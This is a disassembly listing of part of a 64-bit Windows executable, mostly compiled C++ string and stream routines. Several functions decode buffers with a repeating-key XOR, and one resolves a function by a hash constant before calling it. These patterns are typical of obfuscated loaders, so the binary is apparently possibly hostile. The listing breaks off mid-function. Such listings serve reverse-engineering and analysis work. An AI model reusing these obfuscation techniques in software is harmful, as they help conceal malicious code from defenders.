   140005e68:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005e6f:	72 2b                	jb     0x140005e9c
   140005e71:	48 83 c2 27          	add    $0x27,%rdx
   140005e75:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140005e79:	48 2b c1             	sub    %rcx,%rax
   140005e7c:	48 83 e8 08          	sub    $0x8,%rax
   140005e80:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005e84:	76 16                	jbe    0x140005e9c
   140005e86:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005e8b:	45 33 c9             	xor    %r9d,%r9d
   140005e8e:	45 33 c0             	xor    %r8d,%r8d
   140005e91:	33 d2                	xor    %edx,%edx
   140005e93:	33 c9                	xor    %ecx,%ecx
   140005e95:	ff 15 7d 54 00 00    	call   *0x547d(%rip)        # 0x14000b318
   140005e9b:	cc                   	int3
   140005e9c:	e8 5b 29 00 00       	call   0x1400087fc
   140005ea1:	66 0f 6f 05 17 8c 00 	movdqa 0x8c17(%rip),%xmm0        # 0x14000eac0
   140005ea8:	00 
   140005ea9:	f3 0f 7f 45 08       	movdqu %xmm0,0x8(%rbp)
   140005eae:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140005eb2:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   140005eb6:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005eba:	76 43                	jbe    0x140005eff
   140005ebc:	48 ff c2             	inc    %rdx
   140005ebf:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140005ec3:	48 8b c1             	mov    %rcx,%rax
   140005ec6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005ecd:	72 2b                	jb     0x140005efa
   140005ecf:	48 83 c2 27          	add    $0x27,%rdx
   140005ed3:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140005ed7:	48 2b c1             	sub    %rcx,%rax
   140005eda:	48 83 e8 08          	sub    $0x8,%rax
   140005ede:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005ee2:	76 16                	jbe    0x140005efa
   140005ee4:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005ee9:	45 33 c9             	xor    %r9d,%r9d
   140005eec:	45 33 c0             	xor    %r8d,%r8d
   140005eef:	33 d2                	xor    %edx,%edx
   140005ef1:	33 c9                	xor    %ecx,%ecx
   140005ef3:	ff 15 1f 54 00 00    	call   *0x541f(%rip)        # 0x14000b318
   140005ef9:	cc                   	int3
   140005efa:	e8 fd 28 00 00       	call   0x1400087fc
   140005eff:	41 8b c7             	mov    %r15d,%eax
   140005f02:	e9 85 01 00 00       	jmp    0x14000608c
   140005f07:	ff 15 03 51 00 00    	call   *0x5103(%rip)        # 0x14000b010
   140005f0d:	8b f8                	mov    %eax,%edi
   140005f0f:	48 8b 15 62 10 02 00 	mov    0x21062(%rip),%rdx        # 0x140026f78
   140005f16:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005f1b:	e8 f0 03 00 00       	call   0x140006310
   140005f20:	4c 8d 35 a1 89 00 00 	lea    0x89a1(%rip),%r14        # 0x14000e8c8
   140005f27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140005f2e:	00 00 
   140005f30:	48 ff c3             	inc    %rbx
   140005f33:	41 80 3c 1e 00       	cmpb   $0x0,(%r14,%rbx,1)
   140005f38:	75 f6                	jne    0x140005f30
   140005f3a:	48 83 3d 36 10 02 00 	cmpq   $0x0,0x21036(%rip)        # 0x140026f78
   140005f41:	00 
   140005f42:	76 4f                	jbe    0x140005f93
   140005f44:	4c 8d 0d 1d 10 02 00 	lea    0x2101d(%rip),%r9        # 0x140026f68
   140005f4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f50:	4d 8b c1             	mov    %r9,%r8
   140005f53:	48 83 3d 25 10 02 00 	cmpq   $0xf,0x21025(%rip)        # 0x140026f80
   140005f5a:	0f 
   140005f5b:	4c 0f 47 05 05 10 02 	cmova  0x21005(%rip),%r8        # 0x140026f68
   140005f62:	00 
   140005f63:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005f68:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005f6d:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005f73:	33 d2                	xor    %edx,%edx
   140005f75:	48 8b c6             	mov    %rsi,%rax
   140005f78:	48 f7 f3             	div    %rbx
   140005f7b:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   140005f80:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   140005f84:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   140005f87:	48 ff c6             	inc    %rsi
   140005f8a:	48 3b 35 e7 0f 02 00 	cmp    0x20fe7(%rip),%rsi        # 0x140026f78
   140005f91:	72 bd                	jb     0x140005f50
   140005f93:	48 8d 15 c6 04 02 00 	lea    0x204c6(%rip),%rdx        # 0x140026460
   140005f9a:	48 83 3d d6 04 02 00 	cmpq   $0xf,0x204d6(%rip)        # 0x140026478
   140005fa1:	0f 
   140005fa2:	48 0f 47 15 b6 04 02 	cmova  0x204b6(%rip),%rdx        # 0x140026460
   140005fa9:	00 
   140005faa:	44 8b cf             	mov    %edi,%r9d
   140005fad:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005fb2:	e8 49 e6 ff ff       	call   0x140004600
   140005fb7:	49 8b cc             	mov    %r12,%rcx
   140005fba:	ff 15 60 50 00 00    	call   *0x5060(%rip)        # 0x14000b020
   140005fc0:	e9 c2 00 00 00       	jmp    0x140006087
   140005fc5:	ba ee c5 45 ab       	mov    $0xab45c5ee,%edx
   140005fca:	49 8b ce             	mov    %r14,%rcx
   140005fcd:	e8 5e e5 ff ff       	call   0x140004530
   140005fd2:	48 85 c0             	test   %rax,%rax
   140005fd5:	74 05                	je     0x140005fdc
   140005fd7:	48 8b cf             	mov    %rdi,%rcx
   140005fda:	ff d0                	call   *%rax
   140005fdc:	ff 15 2e 50 00 00    	call   *0x502e(%rip)        # 0x14000b010
   140005fe2:	8b f8                	mov    %eax,%edi
   140005fe4:	48 8b 15 0d 0e 02 00 	mov    0x20e0d(%rip),%rdx        # 0x140026df8
   140005feb:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005ff0:	e8 1b 03 00 00       	call   0x140006310
   140005ff5:	4c 8d 0d c4 88 00 00 	lea    0x88c4(%rip),%r9        # 0x14000e8c0
   140005ffc:	0f 1f 40 00          	nopl   0x0(%rax)
   140006000:	48 ff c3             	inc    %rbx
   140006003:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140006008:	75 f6                	jne    0x140006000
   14000600a:	48 83 3d e6 0d 02 00 	cmpq   $0x0,0x20de6(%rip)        # 0x140026df8
   140006011:	00 
   140006012:	76 4f                	jbe    0x140006063
   140006014:	4c 8d 15 cd 0d 02 00 	lea    0x20dcd(%rip),%r10        # 0x140026de8
   14000601b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006020:	4d 8b c2             	mov    %r10,%r8
   140006023:	48 83 3d d5 0d 02 00 	cmpq   $0xf,0x20dd5(%rip)        # 0x140026e00
   14000602a:	0f 
   14000602b:	4c 0f 47 05 b5 0d 02 	cmova  0x20db5(%rip),%r8        # 0x140026de8
   140006032:	00 
   140006033:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006038:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   14000603d:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140006043:	33 d2                	xor    %edx,%edx
   140006045:	48 8b c6             	mov    %rsi,%rax
   140006048:	48 f7 f3             	div    %rbx
   14000604b:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140006050:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   140006054:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   140006057:	48 ff c6             	inc    %rsi
   14000605a:	48 3b 35 97 0d 02 00 	cmp    0x20d97(%rip),%rsi        # 0x140026df8
   140006061:	72 bd                	jb     0x140006020
   140006063:	48 8d 15 f6 03 02 00 	lea    0x203f6(%rip),%rdx        # 0x140026460
   14000606a:	48 83 3d 06 04 02 00 	cmpq   $0xf,0x20406(%rip)        # 0x140026478
   140006071:	0f 
   140006072:	44 8b cf             	mov    %edi,%r9d
   140006075:	48 0f 47 15 e3 03 02 	cmova  0x203e3(%rip),%rdx        # 0x140026460
   14000607c:	00 
   14000607d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006082:	e8 79 e5 ff ff       	call   0x140004600
   140006087:	b8 01 00 00 00       	mov    $0x1,%eax
   14000608c:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140006090:	48 33 cc             	xor    %rsp,%rcx
   140006093:	e8 c8 24 00 00       	call   0x140008560
   140006098:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   14000609f:	00 
   1400060a0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400060a4:	49 8b 73 38          	mov    0x38(%r11),%rsi
   1400060a8:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   1400060ac:	49 8b e3             	mov    %r11,%rsp
   1400060af:	41 5f                	pop    %r15
   1400060b1:	41 5e                	pop    %r14
   1400060b3:	41 5d                	pop    %r13
   1400060b5:	41 5c                	pop    %r12
   1400060b7:	5d                   	pop    %rbp
   1400060b8:	c3                   	ret
   1400060b9:	cc                   	int3
   1400060ba:	cc                   	int3
   1400060bb:	cc                   	int3
   1400060bc:	cc                   	int3
   1400060bd:	cc                   	int3
   1400060be:	cc                   	int3
   1400060bf:	cc                   	int3
   1400060c0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400060c5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400060ca:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400060cf:	56                   	push   %rsi
   1400060d0:	57                   	push   %rdi
   1400060d1:	41 56                	push   %r14
   1400060d3:	48 83 ec 30          	sub    $0x30,%rsp
   1400060d7:	48 8b f1             	mov    %rcx,%rsi
   1400060da:	33 db                	xor    %ebx,%ebx
   1400060dc:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   1400060e0:	48 8b 01             	mov    (%rcx),%rax
   1400060e3:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1400060e7:	48 8b 7c 0a 28       	mov    0x28(%rdx,%rcx,1),%rdi
   1400060ec:	48 85 ff             	test   %rdi,%rdi
   1400060ef:	7e 0c                	jle    0x1400060fd
   1400060f1:	48 83 ff 02          	cmp    $0x2,%rdi
   1400060f5:	7e 06                	jle    0x1400060fd
   1400060f7:	48 83 c7 fe          	add    $0xfffffffffffffffe,%rdi
   1400060fb:	eb 02                	jmp    0x1400060ff
   1400060fd:	33 ff                	xor    %edi,%edi
   1400060ff:	4c 8b f6             	mov    %rsi,%r14
   140006102:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006107:	48 8b 4c 0a 48       	mov    0x48(%rdx,%rcx,1),%rcx
   14000610c:	48 85 c9             	test   %rcx,%rcx
   14000610f:	74 07                	je     0x140006118
   140006111:	48 8b 01             	mov    (%rcx),%rax
   140006114:	ff 50 08             	call   *0x8(%rax)
   140006117:	90                   	nop
   140006118:	48 8b 06             	mov    (%rsi),%rax
   14000611b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000611f:	48 03 ce             	add    %rsi,%rcx
   140006122:	ff 15 50 50 00 00    	call   *0x5050(%rip)        # 0x14000b178
   140006128:	84 c0                	test   %al,%al
   14000612a:	75 06                	jne    0x140006132
   14000612c:	88 44 24 28          	mov    %al,0x28(%rsp)
   140006130:	eb 39                	jmp    0x14000616b
   140006132:	48 8b 06             	mov    (%rsi),%rax
   140006135:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006139:	48 8b 4c 31 50       	mov    0x50(%rcx,%rsi,1),%rcx
   14000613e:	48 85 c9             	test   %rcx,%rcx
   140006141:	74 21                	je     0x140006164
   140006143:	48 3b ce             	cmp    %rsi,%rcx
   140006146:	74 1c                	je     0x140006164
   140006148:	ff 15 62 4f 00 00    	call   *0x4f62(%rip)        # 0x14000b0b0
   14000614e:	48 8b 06             	mov    (%rsi),%rax
   140006151:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006155:	48 03 ce             	add    %rsi,%rcx
   140006158:	ff 15 1a 50 00 00    	call   *0x501a(%rip)        # 0x14000b178
   14000615e:	88 44 24 28          	mov    %al,0x28(%rsp)
   140006162:	eb 07                	jmp    0x14000616b
   140006164:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140006169:	b0 01                	mov    $0x1,%al
   14000616b:	84 c0                	test   %al,%al
   14000616d:	75 0a                	jne    0x140006179
   14000616f:	bb 04 00 00 00       	mov    $0x4,%ebx
   140006174:	e9 b6 00 00 00       	jmp    0x14000622f
   140006179:	48 8b 16             	mov    (%rsi),%rdx
   14000617c:	48 63 42 04          	movslq 0x4(%rdx),%rax
   140006180:	8b 4c 30 18          	mov    0x18(%rax,%rsi,1),%ecx
   140006184:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   14000618a:	83 f9 40             	cmp    $0x40,%ecx
   14000618d:	74 2a                	je     0x1400061b9
   14000618f:	90                   	nop
   140006190:	48 85 ff             	test   %rdi,%rdi
   140006193:	7e 21                	jle    0x1400061b6
   140006195:	48 8b 06             	mov    (%rsi),%rax
   140006198:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000619c:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   1400061a1:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   1400061a6:	ff 15 2c 4f 00 00    	call   *0x4f2c(%rip)        # 0x14000b0d8
   1400061ac:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400061af:	74 55                	je     0x140006206
   1400061b1:	48 ff cf             	dec    %rdi
   1400061b4:	eb da                	jmp    0x140006190
   1400061b6:	48 8b 16             	mov    (%rsi),%rdx
   1400061b9:	48 63 4a 04          	movslq 0x4(%rdx),%rcx
   1400061bd:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400061c3:	48 8d 15 82 87 00 00 	lea    0x8782(%rip),%rdx        # 0x14000e94c
   1400061ca:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   1400061cf:	ff 15 0b 4f 00 00    	call   *0x4f0b(%rip)        # 0x14000b0e0
   1400061d5:	48 83 f8 02          	cmp    $0x2,%rax
   1400061d9:	75 2b                	jne    0x140006206
   1400061db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400061e0:	48 85 ff             	test   %rdi,%rdi
   1400061e3:	7e 2a                	jle    0x14000620f
   1400061e5:	48 8b 06             	mov    (%rsi),%rax
   1400061e8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400061ec:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   1400061f1:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   1400061f6:	ff 15 dc 4e 00 00    	call   *0x4edc(%rip)        # 0x14000b0d8
   1400061fc:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400061ff:	74 05                	je     0x140006206
   140006201:	48 ff cf             	dec    %rdi
   140006204:	eb da                	jmp    0x1400061e0
   140006206:	bb 04 00 00 00       	mov    $0x4,%ebx
   14000620b:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   14000620f:	48 8b 06             	mov    (%rsi),%rax
   140006212:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006216:	48 c7 44 31 28 00 00 	movq   $0x0,0x28(%rcx,%rsi,1)
   14000621d:	00 00 
   14000621f:	eb 0e                	jmp    0x14000622f
   140006221:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006226:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   14000622a:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   14000622f:	48 8b 06             	mov    (%rsi),%rax
   140006232:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006236:	48 03 ce             	add    %rsi,%rcx
   140006239:	45 33 c0             	xor    %r8d,%r8d
   14000623c:	8b d3                	mov    %ebx,%edx
   14000623e:	ff 15 84 4e 00 00    	call   *0x4e84(%rip)        # 0x14000b0c8
   140006244:	90                   	nop
   140006245:	ff 15 6d 4f 00 00    	call   *0x4f6d(%rip)        # 0x14000b1b8
   14000624b:	84 c0                	test   %al,%al
   14000624d:	75 0a                	jne    0x140006259
   14000624f:	49 8b ce             	mov    %r14,%rcx
   140006252:	ff 15 50 4e 00 00    	call   *0x4e50(%rip)        # 0x14000b0a8
   140006258:	90                   	nop
   140006259:	49 8b 06             	mov    (%r14),%rax
   14000625c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006260:	4a 8b 4c 31 48       	mov    0x48(%rcx,%r14,1),%rcx
   140006265:	48 85 c9             	test   %rcx,%rcx
   140006268:	74 07                	je     0x140006271
   14000626a:	48 8b 01             	mov    (%rcx),%rax
   14000626d:	ff 50 10             	call   *0x10(%rax)
   140006270:	90                   	nop
   140006271:	48 8b c6             	mov    %rsi,%rax
   140006274:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006279:	48 83 c4 30          	add    $0x30,%rsp
   14000627d:	41 5e                	pop    %r14
   14000627f:	5f                   	pop    %rdi
   140006280:	5e                   	pop    %rsi
   140006281:	c3                   	ret
   140006282:	cc                   	int3
   140006283:	cc                   	int3
   140006284:	cc                   	int3
   140006285:	cc                   	int3
   140006286:	cc                   	int3
   140006287:	cc                   	int3
   140006288:	cc                   	int3
   140006289:	cc                   	int3
   14000628a:	cc                   	int3
   14000628b:	cc                   	int3
   14000628c:	cc                   	int3
   14000628d:	cc                   	int3
   14000628e:	cc                   	int3
   14000628f:	cc                   	int3
   140006290:	40 53                	rex push %rbx
   140006292:	48 83 ec 30          	sub    $0x30,%rsp
   140006296:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000629a:	48 8b d9             	mov    %rcx,%rbx
   14000629d:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400062a1:	76 2c                	jbe    0x1400062cf
   1400062a3:	48 8b 09             	mov    (%rcx),%rcx
   1400062a6:	48 ff c2             	inc    %rdx
   1400062a9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400062b0:	72 18                	jb     0x1400062ca
   1400062b2:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400062b6:	48 83 c2 27          	add    $0x27,%rdx
   1400062ba:	48 2b c8             	sub    %rax,%rcx
   1400062bd:	48 83 e9 08          	sub    $0x8,%rcx
   1400062c1:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400062c5:	77 21                	ja     0x1400062e8
   1400062c7:	48 8b c8             	mov    %rax,%rcx
   1400062ca:	e8 2d 25 00 00       	call   0x1400087fc
   1400062cf:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   1400062d6:	00 
   1400062d7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400062de:	00 
   1400062df:	c6 03 00             	movb   $0x0,(%rbx)
   1400062e2:	48 83 c4 30          	add    $0x30,%rsp
   1400062e6:	5b                   	pop    %rbx
   1400062e7:	c3                   	ret
   1400062e8:	45 33 c9             	xor    %r9d,%r9d
   1400062eb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400062f2:	00 00 
   1400062f4:	45 33 c0             	xor    %r8d,%r8d
   1400062f7:	33 d2                	xor    %edx,%edx
   1400062f9:	33 c9                	xor    %ecx,%ecx
   1400062fb:	ff 15 17 50 00 00    	call   *0x5017(%rip)        # 0x14000b318
   140006301:	cc                   	int3
   140006302:	cc                   	int3
   140006303:	cc                   	int3
   140006304:	cc                   	int3
   140006305:	cc                   	int3
   140006306:	cc                   	int3
   140006307:	cc                   	int3
   140006308:	cc                   	int3
   140006309:	cc                   	int3
   14000630a:	cc                   	int3
   14000630b:	cc                   	int3
   14000630c:	cc                   	int3
   14000630d:	cc                   	int3
   14000630e:	cc                   	int3
   14000630f:	cc                   	int3
   140006310:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006315:	55                   	push   %rbp
   140006316:	56                   	push   %rsi
   140006317:	57                   	push   %rdi
   140006318:	48 83 ec 30          	sub    $0x30,%rsp
   14000631c:	33 ff                	xor    %edi,%edi
   14000631e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006321:	0f 11 01             	movups %xmm0,(%rcx)
   140006324:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000632b:	ff ff 7f 
   14000632e:	48 89 79 10          	mov    %rdi,0x10(%rcx)
   140006332:	48 89 79 18          	mov    %rdi,0x18(%rcx)
   140006336:	48 8b f2             	mov    %rdx,%rsi
   140006339:	48 8b d9             	mov    %rcx,%rbx
   14000633c:	48 3b d5             	cmp    %rbp,%rdx
   14000633f:	0f 87 db 00 00 00    	ja     0x140006420
   140006345:	48 83 fa 0f          	cmp    $0xf,%rdx
   140006349:	77 2a                	ja     0x140006375
   14000634b:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   14000634f:	4c 8b c2             	mov    %rdx,%r8
   140006352:	33 d2                	xor    %edx,%edx
   140006354:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   14000635b:	00 
   14000635c:	e8 84 31 00 00       	call   0x1400094e5
   140006361:	48 8b c3             	mov    %rbx,%rax
   140006364:	40 88 3c 1e          	mov    %dil,(%rsi,%rbx,1)
   140006368:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000636d:	48 83 c4 30          	add    $0x30,%rsp
   140006371:	5f                   	pop    %rdi
   140006372:	5e                   	pop    %rsi
   140006373:	5d                   	pop    %rbp
   140006374:	c3                   	ret
   140006375:	48 8b c6             	mov    %rsi,%rax
   140006378:	48 83 c8 0f          	or     $0xf,%rax
   14000637c:	48 3b c5             	cmp    %rbp,%rax
   14000637f:	76 31                	jbe    0x1400063b2
   140006381:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140006388:	00 00 80 
   14000638b:	48 83 c0 27          	add    $0x27,%rax
   14000638f:	48 8b c8             	mov    %rax,%rcx
   140006392:	e8 e9 21 00 00       	call   0x140008580
   140006397:	48 85 c0             	test   %rax,%rax
   14000639a:	75 42                	jne    0x1400063de
   14000639c:	45 33 c9             	xor    %r9d,%r9d
   14000639f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400063a4:	45 33 c0             	xor    %r8d,%r8d
   1400063a7:	33 d2                	xor    %edx,%edx
   1400063a9:	33 c9                	xor    %ecx,%ecx
   1400063ab:	ff 15 67 4f 00 00    	call   *0x4f67(%rip)        # 0x14000b318
   1400063b1:	cc                   	int3
   1400063b2:	b9 16 00 00 00       	mov    $0x16,%ecx
   1400063b7:	48 8b e8             	mov    %rax,%rbp
   1400063ba:	48 3b c1             	cmp    %rcx,%rax
   1400063bd:	48 0f 42 e9          	cmovb  %rcx,%rbp
   1400063c1:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   1400063c5:	48 85 c9             	test   %rcx,%rcx
   1400063c8:	74 2a                	je     0x1400063f4
   1400063ca:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400063d1:	72 19                	jb     0x1400063ec
   1400063d3:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400063d7:	48 3b c1             	cmp    %rcx,%rax
   1400063da:	76 4a                	jbe    0x140006426
   1400063dc:	eb b1                	jmp    0x14000638f
   1400063de:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400063e2:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400063e6:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400063ea:	eb 08                	jmp    0x1400063f4
   1400063ec:	e8 8f 21 00 00       	call   0x140008580
   1400063f1:	48 8b f8             	mov    %rax,%rdi
   1400063f4:	4c 8b c6             	mov    %rsi,%r8
   1400063f7:	48 89 3b             	mov    %rdi,(%rbx)
   1400063fa:	33 d2                	xor    %edx,%edx
   1400063fc:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140006400:	48 8b cf             	mov    %rdi,%rcx
   140006403:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   140006407:	e8 d9 30 00 00       	call   0x1400094e5
   14000640c:	48 8b c3             	mov    %rbx,%rax
   14000640f:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   140006413:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006418:	48 83 c4 30          	add    $0x30,%rsp
   14000641c:	5f                   	pop    %rdi
   14000641d:	5e                   	pop    %rsi
   14000641e:	5d                   	pop    %rbp
   14000641f:	c3                   	ret
   140006420:	e8 9b b0 ff ff       	call   0x1400014c0
   140006425:	cc                   	int3
   140006426:	e8 f5 af ff ff       	call   0x140001420
   14000642b:	cc                   	int3
   14000642c:	cc                   	int3
   14000642d:	cc                   	int3
   14000642e:	cc                   	int3
   14000642f:	cc                   	int3
   140006430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006435:	57                   	push   %rdi
   140006436:	48 83 ec 20          	sub    $0x20,%rsp
   14000643a:	48 8b d9             	mov    %rcx,%rbx
   14000643d:	48 8b ca             	mov    %rdx,%rcx
   140006440:	e8 5b 15 00 00       	call   0x1400079a0
   140006445:	48 8b c8             	mov    %rax,%rcx
   140006448:	48 8b f8             	mov    %rax,%rdi
   14000644b:	ff 15 37 4d 00 00    	call   *0x4d37(%rip)        # 0x14000b188
   140006451:	84 c0                	test   %al,%al
   140006453:	74 13                	je     0x140006468
   140006455:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   14000645c:	00 
   14000645d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006462:	48 83 c4 20          	add    $0x20,%rsp
   140006466:	5f                   	pop    %rdi
   140006467:	c3                   	ret
   140006468:	48 8b cb             	mov    %rbx,%rcx
   14000646b:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   14000646f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006474:	48 83 c4 20          	add    $0x20,%rsp
   140006478:	5f                   	pop    %rdi
   140006479:	48 ff 25 90 4c 00 00 	rex.W jmp *0x4c90(%rip)        # 0x14000b110
   140006480:	40 53                	rex push %rbx
   140006482:	48 83 ec 20          	sub    $0x20,%rsp
   140006486:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000648d:	00 
   14000648e:	48 8b d9             	mov    %rcx,%rbx
   140006491:	74 2d                	je     0x1400064c0
   140006493:	48 8b 01             	mov    (%rcx),%rax
   140006496:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000649b:	ff 50 18             	call   *0x18(%rax)
   14000649e:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400064a1:	74 1d                	je     0x1400064c0
   1400064a3:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400064aa:	ff 15 08 4f 00 00    	call   *0x4f08(%rip)        # 0x14000b3b8
   1400064b0:	33 c9                	xor    %ecx,%ecx
   1400064b2:	85 c0                	test   %eax,%eax
   1400064b4:	0f 99 c1             	setns  %cl
   1400064b7:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1400064ba:	48 83 c4 20          	add    $0x20,%rsp
   1400064be:	5b                   	pop    %rbx
   1400064bf:	c3                   	ret
   1400064c0:	33 c0                	xor    %eax,%eax
   1400064c2:	48 83 c4 20          	add    $0x20,%rsp
   1400064c6:	5b                   	pop    %rbx
   1400064c7:	c3                   	ret
   1400064c8:	cc                   	int3
   1400064c9:	cc                   	int3
   1400064ca:	cc                   	int3
   1400064cb:	cc                   	int3
   1400064cc:	cc                   	int3
   1400064cd:	cc                   	int3
   1400064ce:	cc                   	int3
   1400064cf:	cc                   	int3
   1400064d0:	40 53                	rex push %rbx
   1400064d2:	56                   	push   %rsi
   1400064d3:	48 83 ec 48          	sub    $0x48,%rsp
   1400064d7:	48 8b 05 62 bb 00 00 	mov    0xbb62(%rip),%rax        # 0x140012040
   1400064de:	48 33 c4             	xor    %rsp,%rax
   1400064e1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400064e6:	33 f6                	xor    %esi,%esi
   1400064e8:	4d 8b c8             	mov    %r8,%r9
   1400064eb:	48 8b d9             	mov    %rcx,%rbx
   1400064ee:	48 85 d2             	test   %rdx,%rdx
   1400064f1:	75 0b                	jne    0x1400064fe
   1400064f3:	4d 85 c0             	test   %r8,%r8
   1400064f6:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400064fc:	74 03                	je     0x140006501
   1400064fe:	44 8b c6             	mov    %esi,%r8d
   140006501:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140006508:	48 85 c9             	test   %rcx,%rcx
   14000650b:	0f 84 9e 00 00 00    	je     0x1400065af
   140006511:	ff 15 61 4e 00 00    	call   *0x4e61(%rip)        # 0x14000b378
   140006517:	85 c0                	test   %eax,%eax
   140006519:	0f 85 90 00 00 00    	jne    0x1400065af
   14000651f:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140006524:	48 8b cb             	mov    %rbx,%rcx
   140006527:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   14000652e:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140006532:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140006536:	ff 15 d4 4b 00 00    	call   *0x4bd4(%rip)        # 0x14000b110
   14000653c:	48 85 ff             	test   %rdi,%rdi
   14000653f:	74 4e                	je     0x14000658f
